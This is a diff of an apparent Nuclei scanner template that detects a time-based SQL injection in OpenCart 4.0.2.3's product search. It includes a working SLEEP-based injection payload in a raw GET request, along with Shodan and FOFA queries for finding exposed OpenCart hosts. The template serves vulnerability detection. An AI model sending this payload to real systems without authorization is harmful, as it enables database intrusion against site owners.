@@ -1,5 +1,4 @@
 id: opencart-core-sqli
-
 info:
   name: OpenCart Core 4.0.2.3 'search' - SQL Injection
   author: s4e-io
@@ -13,35 +12,33 @@ info:
     cpe: cpe:2.3:a:opencart:opencart:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "(?i)OpenCart"})
+    fofa-query: icon_hash="-1443008128"
     max-request: 2
+    product: opencart
+    shodan-query: title:"OpenCart"
     vendor: opencart
-  tags: time-based-sqli,opencart,sqli,vuln
+  tags: opencart,sqli,time-based-sqli,vuln
 flow: http(1) && http(2)
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: or
         dsl:
-          - 'contains(header, "OCSESSID=")'
-          - 'contains_any(body, "opencart.com", "OpenCart is open source", "content=\"OpenCart")'
-        condition: or
+          - contains(header, "OCSESSID=")
+          - contains_any(body, "opencart.com", "OpenCart is open source", "content=\"OpenCart")
         internal: true
-
-  - raw:
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}'
+  - matchers:
+      - condition: and
+        dsl:
+          - duration>=7
+          - contains(body, "Nabb</title>")
+          - status_code == 200
+        type: dsl
+    raw:
       - |
         @timeout: 15s
         GET /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "duration>=7"
-          - 'contains(body, "Nabb</title>")'
-          - "status_code == 200"
-        condition: and
-
